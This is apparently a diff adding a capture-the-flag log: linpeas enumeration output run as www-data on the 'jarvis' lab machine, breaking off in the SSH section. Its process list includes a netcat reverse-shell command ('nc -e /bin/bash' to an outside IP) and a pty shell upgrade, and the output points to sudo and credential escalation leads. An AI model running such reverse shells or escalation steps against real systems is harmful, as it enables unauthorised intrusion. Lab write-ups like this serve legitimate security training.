@@ -1,0 +1,1756 @@
+www-data@jarvis /tmp $ ./linpeas.sh -a
+ Starting linpeas. Building blacklists...
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.7.9 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.144-3.1 (2019-02-19)
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: jarvis
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.144-3.1 (2019-02-19)
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 9.8 (stretch)
+Release:	9.8
+Codename:	stretch
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.19p1
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Wed Oct  7 13:38:35 EDT 2020
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda1        29G  1.8G   26G   7% /
+udev            479M     0  479M   0% /dev
+tmpfs           490M     0  490M   0% /dev/shm
+tmpfs            98M  5.5M   93M   6% /run
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           490M     0  490M   0% /sys/fs/cgroup
+              total        used        free      shared  buff/cache   available
+Mem:        1001500      208396      324256       26500      468848      582648
+Swap:       1046524           0     1046524
+
+[+] CPU info
+Architecture:          x86_64
+CPU op-mode(s):        32-bit, 64-bit
+Byte Order:            Little Endian
+CPU(s):                1
+On-line CPU(s) list:   0
+Thread(s) per core:    1
+Core(s) per socket:    1
+Socket(s):             1
+NUMA node(s):          1
+Vendor ID:             AuthenticAMD
+CPU family:            23
+Model:                 49
+Model name:            AMD EPYC 7302P 16-Core Processor
+Stepping:              0
+CPU MHz:               2993.431
+BogoMIPS:              5988.75
+Hypervisor vendor:     VMware
+Virtualization type:   full
+L1d cache:             32K
+L1i cache:             32K
+L2 cache:              512K
+L3 cache:              131072K
+NUMA node0 CPU(s):     0
+Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt clwb xsaveopt xsavec xsaves amd_ibpb arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+SHLVL=2
+PS1=\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] 
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=8:13588
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=5228c05aa43b4479b3a8af74caefc4ca
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+HISTSIZE=0
+SHELL=bash
+APACHE_RUN_GROUP=www-data
+APACHE_RUN_USER=www-data
+APACHE_LOG_DIR=/var/log/apache2
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. /etc/apparmor.d
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+[+] Any running containers? ........ No
+
+
+=========================================( Devices )==========================================
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda5
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=d3afa042-69dc-4af4-93e0-0920658096a7 /               ext4    errors=remount-ro 0       1
+UUID=22748697-fe4e-476f-8f22-478d91cf61f4 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/bin/nc
+/bin/netcat
+/bin/nc.traditional
+/usr/bin/wget
+/usr/bin/curl
+/bin/ping
+/usr/bin/gcc
+/usr/bin/g++
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/socat
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+ii  g++                           4:6.3.0-4                      amd64        GNU C++ compiler
+ii  g++-6                         6.3.0-18+deb9u1                amd64        GNU C++ compiler
+ii  gcc                           4:6.3.0-4                      amd64        GNU C compiler
+ii  gcc-6                         6.3.0-18+deb9u1                amd64        GNU C compiler
+/usr/bin/gcc
+/usr/bin/g++
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+message+    362  0.0  0.3  45116  3748 ?        Ss   11:04   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+mysql       599  0.0  8.4 655428 84384 ?        Ssl  11:04   0:03 /usr/sbin/mysqld
+root          1  0.0  0.6 138788  6760 ?        Ss   11:04   0:01 /sbin/init
+root        200  0.0  0.5  56800  5316 ?        Ss   11:04   0:01 /lib/systemd/systemd-journald
+root        206  0.0  1.0 207512 10520 ?        Ssl  11:04   0:06 /usr/bin/vmtoolsd
+root        229  0.0  0.3  45488  3732 ?        Ss   11:04   0:00 /lib/systemd/systemd-udevd
+root        371  0.0  0.2  37980  2220 ?        Ss   11:04   0:00 /lib/systemd/systemd-logind
+root        374  0.0  0.3 250112  3208 ?        Ssl  11:04   0:00 /usr/sbin/rsyslogd -n
+root        376  0.0  2.6 229376 26696 ?        Ss   11:04   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
+root        377  0.0  0.2  29664  2964 ?        Ss   11:04   0:00 /usr/sbin/cron -f
+root        378  0.0  1.8 153488 18236 ?        Ss   11:04   0:00 /usr/bin/VGAuthService
+root        379  1.0  1.7 358988 17224 ?        Ss   11:04   1:39 python3 /root/sqli_defender.py
+root        402  0.0  0.1  14524  1680 tty1     Ss+  11:04   0:00 /sbin/agetty --noclear tty1 linux
+root        561  0.0  0.6  69952  6228 ?        Ss   11:04   0:00 /usr/sbin/sshd -D
+root        606  0.0  2.5 271396 25852 ?        Ss   11:04   0:00 /usr/sbin/apache2 -k start
+systemd+    307  0.0  0.4 127284  4244 ?        Ssl  11:04   0:00 /lib/systemd/systemd-timesyncd
+www-data    423  0.0  0.6 229376  6408 ?        S    11:04   0:00 php-fpm: pool www
+www-data    424  0.0  0.6 229376  6408 ?        S    11:04   0:00 php-fpm: pool www
+www-data    973  0.0  1.3 272060 13372 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1011  0.0  1.3 272060 13380 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1015  0.0  1.3 272060 13336 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1016  0.0  1.3 271876 13696 ?        S    11:34   0:03 /usr/sbin/apache2 -k start
+www-data   1025  0.0  1.3 272060 13360 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1036  0.0  1.3 271996 13336 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1039  0.0  1.3 272060 13364 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1040  0.0  1.3 272060 13388 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1057  0.0  1.3 272060 13348 ?        S    11:34   0:02 /usr/sbin/apache2 -k start
+www-data   1320  0.0  1.3 271872 13096 ?        S    11:57   0:00 /usr/sbin/apache2 -k start
+www-data   1610  0.0  0.0   4276   788 ?        S    13:36   0:00 sh -c nc -e /bin/bash 10.10.14.78 443
+www-data   1611  0.0  0.2  17940  2884 ?        S    13:36   0:00 bash
+www-data   1615  0.0  0.9  36488  9184 ?        S    13:37   0:00 python3 -c import pty; pty.spawn("/bin/bash")
+www-data   1616  0.0  0.3  18216  3340 pts/0    Ss   13:37   0:00 /bin/bash
+www-data   1625  0.3  0.2   4608  2056 pts/0    S+   13:38   0:00 /bin/sh ./linpeas.sh -a
+www-data   2165  0.0  0.2  36632  2864 pts/0    R+   13:38   0:00 ps aux
+www-data   2167  0.0  0.0  12708   736 pts/0    S+   13:38   0:00 sort
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root  1099016 May 15  2017 /bin/bash
+lrwxrwxrwx 1 root root        4 Jan 24  2017 /bin/sh -> dash
+-rwxr-xr-x 1 root root   121256 Feb 17  2019 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   207336 Feb 17  2019 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root    39248 Feb 17  2019 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   465680 Feb 17  2019 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    57680 Mar  7  2018 /sbin/agetty
+lrwxrwxrwx 1 root root       20 Feb 17  2019 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root   152232 Jul 25  2017 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root   224208 Mar  2  2018 /usr/bin/dbus-daemon[0m
+-rwxr-xr-x 1 root root    48656 Jul 25  2017 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root   666760 Nov  3  2018 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    48616 Oct  7  2017 /usr/sbin/cron
+-rwxr-xr-x 1 root root 17816520 Aug  8  2018 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root   651576 Jan 18  2017 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root   791024 Mar  1  2019 /usr/sbin/sshd
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 process found (dump creds from memory as root)
+sshd Not Found
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+      3 /bin/sh -e /usr/lib/php/sessionclean
+      1 sort -u -t: -k 1,1
+      1 sort -rn -t: -k2,2
+      1 /usr/sbin/CRON -f
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+-rw-r--r-- 1 root root  722 Oct  7  2017 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Mar  2  2019 .
+drwxr-xr-x 80 root root 4096 Aug  7  2019 ..
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+-rw-r--r--  1 root root  712 Jan  1  2017 php
+
+/etc/cron.daily:
+total 44
+drwxr-xr-x  2 root root 4096 Mar  4  2019 .
+drwxr-xr-x 80 root root 4096 Aug  7  2019 ..
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+-rwxr-xr-x  1 root root  539 Nov  3  2018 apache2
+-rwxr-xr-x  1 root root 1474 Jan 18  2019 apt-compat
+-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
+-rwxr-xr-x  1 root root 1597 Jun 25  2018 dpkg
+-rwxr-xr-x  1 root root 2211 Apr 13  2014 locate
+-rwxr-xr-x  1 root root   89 May  5  2015 logrotate
+-rwxr-xr-x  1 root root 1065 Dec 13  2016 man-db
+-rwxr-xr-x  1 root root  249 May 17  2017 passwd
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar  2  2019 .
+drwxr-xr-x 80 root root 4096 Aug  7  2019 ..
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar  2  2019 .
+drwxr-xr-x 80 root root 4096 Aug  7  2019 ..
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Mar  2  2019 .
+drwxr-xr-x 80 root root 4096 Aug  7  2019 ..
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+-rwxr-xr-x  1 root root  723 Dec 13  2016 man-db
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+[+] Services
+[i] Search for outdated versions
+ [ + ]  apache-htcacheclean
+ [ - ]  apache2
+ [ - ]  console-setup.sh
+ [ - ]  cron
+ [ - ]  dbus
+ [ - ]  hwclock.sh
+ [ - ]  keyboard-setup.sh
+ [ - ]  kmod
+ [ - ]  mysql
+ [ - ]  networking
+ [ - ]  open-vm-tools
+ [ - ]  php7.0-fpm
+ [ - ]  procps
+ [ - ]  rsync
+ [ - ]  rsyslog
+ [ - ]  ssh
+ [ - ]  sudo
+ [ - ]  udev
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/lib/systemd/system/emergency.service is executing some relative path
+/lib/systemd/system/networking.service is executing some relative path
+/lib/systemd/system/rescue.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
+:1.0                               1 systemd         root             :1.0          init.scope                -          -                  
+:1.1                             371 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
+:1.5                            9029 busctl          www-data         :1.5          apache2.service           -          -                  
+org.freedesktop.DBus             362 dbus-daemon     messagebus       org.freedesktop.DBus dbus.service              -          -                  
+org.freedesktop.hostname1          - -               -                (activatable) -                         -         
+org.freedesktop.locale1            - -               -                (activatable) -                         -         
+org.freedesktop.login1           371 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
+org.freedesktop.network1           - -               -                (activatable) -                         -         
+org.freedesktop.resolve1           - -               -                (activatable) -                         -         
+org.freedesktop.systemd1           1 systemd         root             :1.0          init.scope                -          -                  
+org.freedesktop.timedate1          - -               -                (activatable) -                         -         
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+jarvis
+127.0.0.1	localhost
+127.0.1.1	jarvis.htb	jarvis
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+domain localdomain
+search localdomain
+nameserver 1.1.1.1
+htb
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+default		0.0.0.0
+loopback	127.0.0.0
+link-local	169.254.0.0
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+    link/ether 00:50:56:b9:c6:04 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.143/24 brd 10.10.10.255 scope global ens33
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:c604/64 scope global mngtmpaddr dynamic 
+       valid_lft 86096sec preferred_lft 14096sec
+    inet6 fe80::250:56ff:feb9:c604/64 scope link 
+       valid_lft forever preferred_lft forever
+
+[+] Networks and neighbours
+10.10.10.2 dev ens33 lladdr 00:50:56:b9:83:d8 REACHABLE
+fe80::250:56ff:feb9:83d8 dev ens33 lladdr 00:50:56:b9:83:d8 router STALE
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/proc/sys/kernel/yama/ptrace_scope is enabled (0)
+gdb wasn't found in PATH
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+It's not possible to brute-force su.
+
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
+uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
+uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=105(messagebus) gid=110(messagebus) groups=110(messagebus)
+uid=106(mysql) gid=112(mysql) groups=112(mysql)
+uid=107(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 13:39:51 up  2:35,  0 users,  load average: 0.27, 0.10, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+root     pts/1        tmux(1269).%3    Sat Mar  2 10:34 - down   (00:35)
+root     pts/2        tmux(1269).%2    Sat Mar  2 10:17 - 10:33  (00:16)
+root     pts/1        tmux(1269).%1    Sat Mar  2 10:13 - 10:33  (00:19)
+root     pts/0        tmux(1269).%0    Sat Mar  2 10:13 - down   (00:56)
+root     tty1                          Sat Mar  2 09:29 - down   (01:40)
+reboot   system boot  4.9.0-8-amd64    Sat Mar  2 09:28 - 11:10  (01:41)
+root     tty1                          Sat Mar  2 08:54 - crash  (00:34)
+reboot   system boot  4.9.0-8-amd64    Sat Mar  2 08:54 - 11:10  (02:15)
+
+wtmp begins Sat Mar  2 08:54:37 2019
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             tty1                      Wed Aug  7 08:13:17 -0400 2019
+pepper           pts/0    172.16.204.1     Tue Mar  5 10:23:48 -0500 2019
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql  Ver 15.1 Distrib 10.1.37-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user		= mysql
+Found readable /etc/mysql/my.cnf
+[client-server]
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mariadb.conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.25 (Debian)
+Server built:   2018-11-03T18:46:19
+PHP exec extensions
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+Found 
+cat: '': No such file or directory
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+/usr/share/doc/rsync/examples/rsyncd.conf
+[ftp]
+	comment = public archive
+	path = /var/www/pub
+	use chroot = yes
+	lock file = /var/lock/rsyncd
+	read only = yes
+	list = yes
+	uid = nobody
+	gid = nogroup
+	strict modes = yes
+	ignore errors = no
+	ignore nonreadable = yes
+	transfer logging = no
+	timeout = 600
+	refuse options = checksum dry-run
+	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+ChallengeResponseAuthentication no
+UsePAM yes
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
